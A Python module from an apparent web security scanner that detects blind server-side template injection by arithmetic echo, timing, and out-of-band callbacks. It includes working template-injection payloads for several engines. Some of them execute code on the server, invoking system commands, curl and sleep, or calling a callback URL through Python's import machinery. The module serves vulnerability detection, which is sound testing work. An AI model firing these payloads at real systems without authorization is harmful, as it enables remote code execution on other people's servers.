"""Blind server-side template injection (Jinja2 / Twig / Freemarker / ERB / Velocity).

The legacy ``modules.ssti`` checker relies on echo-back: send ``{{7*7}}``,
look for ``49`` in the response. That fails on apps where the template
output isn't reflected, or where the renderer is invoked server-side
without the result reaching the client (logging, email, PDF rendering).

Blind detection has three oracles:

1. **Time-based** — engines that allow function evaluation will sit on
   a ``range(...) | list`` (Jinja2) or ``sleep`` equivalent. We compare
   elapsed time against a benign baseline.
2. **Out-of-band (OOB)** — ``utils.oob.OOBClient`` provisions a unique
   callback URL; templates that can issue outbound HTTP (or DNS) will
   reach it. Most reliable signal — no false positives from natural
   latency jitter.
3. **Arithmetic echo (fallback)** — when echo-back is partially
   present, ``{{7*7}}`` → ``49`` still wins; we keep this for the
   common case but classify the detection medium severity.

Engine-specific syntax matters: Twig uses ``{{ }}``; Freemarker uses
``${ }``; ERB uses ``<%= %>``; Velocity uses ``$math.add``. We probe
each so detection isn't biased toward Python stacks.
"""

from __future__ import annotations

import time
from dataclasses import dataclass
from typing import Any, Callable, Iterable, Optional


# ── Probe catalogue ─────────────────────────────────────────────────────────


@dataclass(frozen=True)
class SstiProbe:
    label: str
    engine: str
    payload: str
    expected_marker: str = ""           # arithmetic / echo-back marker
    sleep_seconds: int = 0              # for time-based probes
    oob_marker: str = ""                # token to splice into OOB callback URL


ARITHMETIC_PROBES: tuple[SstiProbe, ...] = (
    SstiProbe("jinja2_math",   "Jinja2",     "{{7*7}}",        expected_marker="49"),
    SstiProbe("twig_math",     "Twig",       "{{7*'7'}}",      expected_marker="7777777"),
    SstiProbe("freemarker",    "Freemarker", "${7*7}",         expected_marker="49"),
    SstiProbe("velocity",      "Velocity",   "#set($x=7*7)$x", expected_marker="49"),
    SstiProbe("erb_ruby",      "ERB",        "<%= 7*7 %>",     expected_marker="49"),
    SstiProbe("smarty",        "Smarty",     "{7*7}",          expected_marker="49"),
    SstiProbe("razor",         "Razor",      "@(7*7)",         expected_marker="49"),
)


def _time_payload(engine: str, seconds: int) -> str:
    """Return a payload that *should* take ``seconds`` to render on the engine."""
    if engine == "Jinja2":
        # range().count(...) burns CPU rather than calling sleep — works on
        # locked-down sandboxes that block import.
        n = seconds * 4_000_000
        return f"{{{{range({n}) | list | length}}}}"
    if engine == "Twig":
        return f"{{{{'a' * {seconds * 10_000_000}}}}}"
    if engine == "Freemarker":
        return f'<#assign ex="freemarker.template.utility.Execute"?new()>' \
               f'${{ex("sleep {seconds}")}}'
    return ""


def time_based_probes(seconds: int = 3) -> tuple[SstiProbe, ...]:
    out: list[SstiProbe] = []
    for engine in ("Jinja2", "Twig", "Freemarker"):
        payload = _time_payload(engine, seconds)
        if not payload:
            continue
        out.append(
            SstiProbe(
                label=f"{engine.lower()}_time",
                engine=engine,
                payload=payload,
                sleep_seconds=seconds,
            )
        )
    return tuple(out)


def oob_probes(callback_url: str, token: str) -> tuple[SstiProbe, ...]:
    """Build OOB-callback probes that bake ``token`` into the callback URL.

    The OOB listener tracks tokens, so the caller can correlate a hit
    back to the exact probe label.
    """
    target = f"{callback_url.rstrip('/')}/{token}"
    return (
        SstiProbe(
            "jinja2_oob",
            "Jinja2",
            (
                "{{ self.__init__.__globals__.__builtins__.__import__"
                f"('urllib.request').urlopen('{target}') }}"
            ),
            oob_marker=token,
        ),
        SstiProbe(
            "twig_oob",
            "Twig",
            "{{['curl','-s','" + target + "']|filter('system')|join(' ')}}",
            oob_marker=token,
        ),
        SstiProbe(
            "freemarker_oob",
            "Freemarker",
            (
                '<#assign ex="freemarker.template.utility.Execute"?new()>'
                f'${{ex("curl -s {target}")}}'
            ),
            oob_marker=token,
        ),
    )


# ── Findings ────────────────────────────────────────────────────────────────


@dataclass
class SstiFinding:
    url: str
    param: str
    engine: str
    oracle: str          # "arithmetic" | "time_based" | "oob"
    payload: str
    severity: str
    evidence: str

    def to_dict(self) -> dict:
        return {
            "type": "Blind_SSTI",
            "url": self.url,
            "param": self.param,
            "severity": self.severity,
            "evidence": self.evidence,
            "engine": self.engine,
            "oracle": self.oracle,
            "payload": self.payload,
            "module": "blind_ssti",
        }


# ── Detection oracles ─────────────────────────────────────────────────────


def detect_arithmetic_echo(
    submit: Callable[[str], Any],
    *,
    url: str,
    param: str,
    probes: Iterable[SstiProbe] = ARITHMETIC_PROBES,
) -> list[SstiFinding]:
    """Send arithmetic payloads; finding fires when the marker echoes back."""
    findings: list[SstiFinding] = []
    for probe in probes:
        try:
            response = submit(probe.payload)
        except Exception:  # noqa: BLE001
            continue
        body = getattr(response, "text", "") or ""
        if probe.expected_marker and probe.expected_marker in body:
            findings.append(
                SstiFinding(
                    url=url,
                    param=param,
                    engine=probe.engine,
                    oracle="arithmetic",
                    payload=probe.payload,
                    severity="high",
                    evidence=(
                        f"Echo-back arithmetic confirmed {probe.engine} "
                        f"template injection: payload={probe.payload!r} "
                        f"→ marker {probe.expected_marker!r} found in body."
                    ),
                )
            )
    return findings


def detect_time_based(
    submit: Callable[[str], Any],
    *,
    url: str,
    param: str,
    probes: Optional[Iterable[SstiProbe]] = None,
    baseline_ms: Optional[float] = None,
    safety_margin_ms: float = 800.0,
    clock: Callable[[], float] = time.monotonic,
) -> list[SstiFinding]:
    """Compare each time probe's elapsed time against the benign baseline.

    The caller can supply ``baseline_ms`` (e.g. from a prior healthy
    request); when ``None`` we measure it ourselves with a no-op
    payload. ``safety_margin_ms`` absorbs natural jitter — anything
    less than that above baseline is ignored.
    """
    findings: list[SstiFinding] = []
    probe_set = tuple(probes) if probes is not None else time_based_probes()

    if baseline_ms is None:
        try:
            start = clock()
            submit("plain-noop-baseline")
            baseline_ms = (clock() - start) * 1000.0
        except Exception:  # noqa: BLE001
            baseline_ms = 0.0

    for probe in probe_set:
        start = clock()
        try:
            submit(probe.payload)
        except Exception:  # noqa: BLE001
            continue
        elapsed_ms = (clock() - start) * 1000.0
        threshold_ms = baseline_ms + (probe.sleep_seconds * 1000.0) - safety_margin_ms
        if elapsed_ms >= threshold_ms and probe.sleep_seconds > 0:
            findings.append(
                SstiFinding(
                    url=url,
                    param=param,
                    engine=probe.engine,
                    oracle="time_based",
                    payload=probe.payload,
                    severity="high",
                    evidence=(
                        f"Response elapsed {elapsed_ms:.0f}ms vs baseline "
                        f"{baseline_ms:.0f}ms (probe expected ≥"
                        f"{threshold_ms:.0f}ms); {probe.engine} blind SSTI."
                    ),
                )
            )
    return findings


def detect_oob(
    submit: Callable[[str], Any],
    *,
    url: str,
    param: str,
    callback_url: str,
    token: str,
    oob_received: Callable[[str], bool],
    probes: Optional[Iterable[SstiProbe]] = None,
) -> list[SstiFinding]:
    """Send OOB payloads; ``oob_received(token)`` must report a callback hit.

    The caller is responsible for the OOB listener — we keep it pluggable
    so this module isn't coupled to ``utils.oob`` for unit testing.
    """
    findings: list[SstiFinding] = []
    probe_set = tuple(probes) if probes is not None else oob_probes(callback_url, token)
    for probe in probe_set:
        try:
            submit(probe.payload)
        except Exception:  # noqa: BLE001
            continue
        if oob_received(probe.oob_marker or token):
            findings.append(
                SstiFinding(
                    url=url,
                    param=param,
                    engine=probe.engine,
                    oracle="oob",
                    payload=probe.payload,
                    severity="critical",
                    evidence=(
                        f"OOB callback received from {probe.engine} template "
                        f"(token={probe.oob_marker or token!r}); blind SSTI "
                        f"with RCE-grade primitives confirmed."
                    ),
                )
            )
    return findings


# ── Orchestrator ──────────────────────────────────────────────────────────


def scan_for_blind_ssti(
    submit: Callable[[str], Any],
    *,
    url: str,
    param: str,
    enable_arithmetic: bool = True,
    enable_time_based: bool = False,    # opt-in — slow
    enable_oob: bool = False,           # opt-in — needs OOB infrastructure
    oob_callback_url: str = "",
    oob_token: str = "",
    oob_received: Optional[Callable[[str], bool]] = None,
) -> list[dict]:
    """Run every enabled oracle. Returns vuln-dict findings."""
    findings: list[SstiFinding] = []
    if enable_arithmetic:
        findings.extend(detect_arithmetic_echo(submit, url=url, param=param))
    if enable_time_based:
        findings.extend(detect_time_based(submit, url=url, param=param))
    if enable_oob and oob_received and oob_callback_url and oob_token:
        findings.extend(
            detect_oob(
                submit,
                url=url,
                param=param,
                callback_url=oob_callback_url,
                token=oob_token,
                oob_received=oob_received,
            )
        )
    return [f.to_dict() for f in findings]
